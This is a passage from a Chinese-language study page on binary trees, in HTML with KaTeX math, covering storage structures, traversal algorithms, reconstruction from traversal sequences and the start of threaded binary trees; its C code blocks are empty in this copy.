class="strut" style="height:0.6835em;vertical-align:-0.0391em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7733em;vertical-align:-0.1367em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9324em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">h</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> 或 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mrow><mi>h</mi><mo>−</mo><mn>1</mn></mrow></msup><mo>⩽</mo><mi>n</mi><mo>&lt;</mo><msup><mn>2</mn><mi>h</mi></msup></mrow><annotation encoding="application/x-tex">2^{h-1} \leqslant n &lt; 2^{h}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9858em;vertical-align:-0.1367em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">h</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">h</span></span></span></span></span></span></span></span></span></span></span></span> 得 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mrow><mi>h</mi><mo>−</mo><mn>1</mn></mrow></msup><mo>&lt;</mo><mi>n</mi><mo>+</mo><mn>1</mn><mo>⩽</mo><msup><mn>2</mn><mi>h</mi></msup></mrow><annotation encoding="application/x-tex">2^{h-1} &lt; n + 1 \leqslant 2^{h}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8882em;vertical-align:-0.0391em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">h</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7811em;vertical-align:-0.1367em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">h</span></span></span></span></span></span></span></span></span></span></span></span>，即 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi><mo>−</mo><mn>1</mn><mo>&lt;</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>n</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo>⩽</mo><mi>h</mi></mrow><annotation encoding="application/x-tex">h - 1 &lt; log_{2}(n + 1) \leqslant h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6835em;vertical-align:-0.0391em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">h</span></span></span></span>，因为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi></mrow><annotation encoding="application/x-tex">h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">h</span></span></span></span> 为正整数，所以 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi><mo>=</mo><mo stretchy="false">⌈</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>n</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">⌉</mo></mrow><annotation encoding="application/x-tex">h = \lceil log_{2}(n + 1) \rceil</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌈</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)⌉</span></span></span></span>；或者得 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi><mo>−</mo><mn>1</mn><mo>⩽</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi>n</mi><mo>&lt;</mo><mi>h</mi></mrow><annotation encoding="application/x-tex">h - 1 \leqslant log_{2}n &lt; h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7811em;vertical-align:-0.1367em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">h</span></span></span></span>，所以 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi><mo>=</mo><mo stretchy="false">⌊</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mi>n</mi><mo stretchy="false">⌋</mo><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">h = \lfloor log_{2}n \rfloor + 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌊</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">n</span><span class="mclose">⌋</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>。</p>
</li>
</ol>
</li>
</ol>
<h4> 二叉树的存储结构</h4>
<ol>
<li>
<p><strong>顺序存储结构</strong></p>
<p><strong>二叉树的顺序存储是指</strong> 用一组地址连续的存储单元依次自上而下、自左至右存储完全二叉树上的结点元素，即将完全二叉树上编号为 <code>i</code> 的结点元素存储在一维数组下标为 <code>i - 1</code> 的分量中。</p>
<p>依据二叉树的性质，完全二叉树和满二叉树采用顺序存储比较合适，树中结点的序号可以唯一地反映结点之间的逻辑关系，这样既能最大可能地节省存储空间，又能利用数组元素的下标值确定结点在二叉树中的位置，以及结点之间的关系。</p>
<p>但对于一般的二叉树，为了让数组下标能反映二叉树中结点之间的逻辑关系，只能添加一些并不存在的空结点，让其每个结点与完全二叉树上的结点相对照，再存储到一维数组的相应分量中。然而，在最坏情况下，一个高度为 <code>h</code> 且只有 <code>h</code> 个结点的单支树却需要占据近 2<sup>h</sup> - 1 个存储单元。用 <code>0</code> 表示二叉树的顺序存储中并不存在的空结点。</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>这种存储结构建议从数组下标 <code>1</code> 开始存储树中的结点，若从数组下标 <code>0</code> 开始存储，则不满足性质 <code>4</code> 的描述（比如：结点 A 存储在 <code>0</code> 下标位置上时，无法根据性质 <code>4</code> 来计算出其孩子结点在数组中的位置）</p>
</div>
</li>
<li>
<p><strong>链式存储结构</strong></p>
<p>由于顺序存储的空间利用率较低，因此二叉树一般都采用链式存储结构，用链表结点来存储二叉树中的每个结点。在二叉树中，结点结构通常包括若干数据域和若干指针域，二叉链表至少包含 <code>3</code> 个域：左指针域 lchild、数据域 data 和右指针域 rchild。</p>
<p>实际上在不同的应用中，还可以增加某些指针域，如增加指向父结点的指针后，变为三叉链表的存储结构。</p>
<p>二叉树的链式存储结构描述如下：</p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>使用不同的存储结构时，实现二叉树操作的算法也会不同，因此要根据实际应用场合（二叉树的形态和需要进行的运算）来选择合适的存储结构。容易验证，在含有 <code>n</code> 个结点的二叉链表中，含有 <code>n + 1</code> 个空链域。</p>
</li>
</ol>
<h3> 二叉树的遍历和线索二叉树</h3>
<h4> 二叉树的遍历</h4>
<p><strong>二叉树的遍历</strong> 是指按某条搜索路径访问树中每个结点，使得每个结点均被访问一次，而且仅被访问一次。由于二叉树是一种非线性结构，每个结点都可能有两棵子树，因而需要寻找一种规律，以便使二叉树上的结点能排列在一个线性队列上，进而便于遍历。</p>
<p>由二叉树的递归定义可知，遍历一棵二叉树便要决定对根结点 N、左子树 L 和右子树 R 的访问顺序。按照先遍历左子树再遍历右子树的原则，常见的遍历次序有先序（NLR）、中序（LNR）和后序（LRN）三种遍历算法，其中 “序” 指的是根结点在何时被访问。</p>
<ol>
<li>
<p><strong>先序遍历</strong></p>
<p>先序遍历（PreOrder）的操作过程如下。若二叉树为空，则什么也不做；否则：</p>
<ol>
<li>访问根结点</li>
<li>先序遍历左子树</li>
<li>先序遍历右子树</li>
</ol>
<p>对应的递归算法如下:</p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
<li>
<p><strong>中序遍历</strong></p>
<p>中序遍历（InOrder）的操作过程如下。若二叉树为空，则什么也不做；否则：</p>
<ol>
<li>中序遍历左子树</li>
<li>访问根结点</li>
<li>中序遍历右子树</li>
</ol>
<p>对应的递归算法如下:</p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
<li>
<p><strong>后序遍历</strong></p>
<p>后序遍历（PostOrder）的操作过程如下。若二叉树为空，则什么也不做；否则：</p>
<ol>
<li>后序遍历左子树</li>
<li>后序遍历右子树</li>
<li>访问根结点</li>
</ol>
<p>对应的递归算法如下：</p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li>
</ol>
<p>三种遍历算法中，递归遍历左、右子树的顺序都是固定的，只是访问根结点的顺序不同。不管采用哪种遍历算法，每个结点都访问一次且仅访问一次，故时间复杂度都是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>。在递归遍历中，递归工作栈的栈深恰好为树的深度，所以在最坏情况下，二叉树是有 <code>n</code> 个结点且深度为 <code>n</code> 的单支树，遍历算法的空间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>。</p>
<ol start="4">
<li>
<p><strong>递归算法和非递归算法的转换</strong></p>
<p>在上节介绍的三种遍历算法中，暂时抹去和递归无关的 <code>visit()</code> 语句，则 <code>3</code> 个遍历算法完全相同，因此，从递归执行过程的角度看先序、中序和后序遍历也是完全相同的。</p>
<p><strong>中序遍历的非递归算法如下：</strong></p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>先序遍历和中序遍历的基本思想是类似的，只需把访问结点操作放在入栈操作的前面。<strong>先序遍历的非递归算法如下:</strong></p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>后序遍历的非递归实现是三种遍历方法中最难的。因为在后序遍历中，要保证左孩子和右孩子都己被访问并且左孩子在右孩子前访问才能访问根结点，这就为流程的控制带来了难题。</p>
<p><strong>后序非递归遍历算法的思路分析</strong>：从根结点开始，将其入栈，然后沿其左子树一直往下搜索，直到搜索到没有左孩子的结点，但是此时不能出栈并访问，因为如果其有右子树，还需按相同的规则对其右子树进行处理。直至上述操作进行不下去，若栈顶元素想要出栈被访问，要么右子树为空，要么右子树刚被访问完（此时左子树早已访问完），这样就保证了正确的访问顺序。</p>
</li>
<li>
<p><strong>层次遍历</strong></p>
<p>要进行层次遍历，需要借助一个队列。首先将二叉树根结点入队，然后出队，访问出队结点，若它有左子树，则将左子树根结点入队；若它有右子树，则将右子树根结点入队。完成入队后出队，访问出队结点……如此反复，直至队列为空。<strong>二叉树的层次遍历算法如下：</strong></p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>遍历是二叉树各种操作的基础，可以在遍历的过程中对结点进行各种操作。例如，对于一棵已知树求结点的双亲、求结点的孩子结点、求二叉树的深度、求二叉树的叶结点个数、判断两棵二叉树是否相同等。所有这些操作都建立在二叉树遍历的基础上，因此必须掌握二叉树的各种遍历过程，并能灵活运用以解决各种问题</p>
</div>
</li>
<li>
<p><strong>由遍历序列构造二叉树</strong></p>
<p>由二叉树的先序序列和中序序列可以唯一地确定一棵二叉树。</p>
<p>在先序遍历序列中，第一个结点一定是二叉树的根结点；而在中序遍历中，根结点必然将中序序列分割成两个子序列，前一个子序列是根结点的左子树的中序序列，后一个子序列是根结点的右子树的中序序列。根据这两个子序列，在先序序列中找到对应的左子序列和右子序列。在先序序列中，左子序列的第一个结点是左子树的根结点，右子序列的第一个结点是右子树的根结点。如此递归地进行下去，便能唯一地确定这棵二叉树。</p>
<p>同理，由二叉树的后序序列和中序序列也可以唯一地确定一棵二叉树。</p>
<p>因为后序序列的最后一个结点就如同先序序列的第一个结点，可以将中序序列分割成两个子序列，然后采用类似的方法递归地进行划分，进而得到一棵二叉树。</p>
<p>由二叉树的层序序列和中序序列也可以唯一地确定一棵二叉树。需要注意的是，若只知道二叉树的先序序列和后序序列，则无法唯一确定一棵二叉树。</p>
<p>例如，求先序序列（ABCDEFGHI）和中序序列（BCAEDGHFI）所确定的二叉树。</p>
<p>首先，由先序序列可知 A 为二叉树的根结点。中序序列中 A 之前的 BC 为左子树的中序序列，EDGHFI 为右子树的中序序列。然后，由先序序列可知 B 是左子树的根结点，D 是右子树的根结点。以此类推，就能将剩下的结点继续分解下去，最后得到二叉树。</p>
</li>
</ol>
<h4> 线索二叉树</h4>
<ol>
<li>
<p><strong>线索二叉树的基本概念</strong></p>
<p>遍历二叉树是以一定的规则将二叉树中的结点排列成一个线性序列，从而得到几种遍历序列，使得该序列中的每个结点（第一个和最后一个结点除外）都有一个直接前驱和直接后继。</p>
<p>传统的二叉链表存储仅能体现一种父子关系，不能直接得到结点在遍历中的前驱或后继。前面提到，在含 <code>n</code> 个结点的二叉树中，有 <code>n + 1</code> 个空指针。这是因为每个叶结点都有 <code>2</code> 个空指针，每个度为 <code>1</code> 的结点都有 <code>1</code> 个空指针，空指针总数为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><msub><mi>n</mi><mn>0</mn></msub><mo>+</mo><msub><mi>n</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">2n_{0} + n_{1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7944em;vertical-align:-0.15em;"></span><span class="mord">2</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，又 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mn>0</mn></msub><mo>=</mo><msub><mi>n</mi><mn>2</mn></msub><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">n_{0} = n_{2} + 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>，所以空指针总数为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mn>0</mn></msub><mo>+</mo><msub><mi>n</mi><mn>1</mn></msub><mo>+</mo><msub><mi>n</mi><mn>2</mn></msub><mo>+</mo><mn>1</mn><mo>=</mo><mi>n</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">n_{0} + n_{1} + n_{2} + 1 = n + 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>。由此设想能否利用这些空指针来存放指向其前驱或后继的指针？这样就可以像遍历单链表那样方便地遍历二叉树。引入线索二叉树正是为了加快查找结点前驱和后继的速度。</p>
<p>规定：若无左子树，令 <code>lchild</code> 指向其前驱结点；若无右子树，令 <code>rchild</code> 指向其后继结点。线索二叉树的结点结构如下，还需增加两个标志域标识指针域，以指向左（右）孩子或前驱（后继）。</p>
<table>
<thead>
<tr>
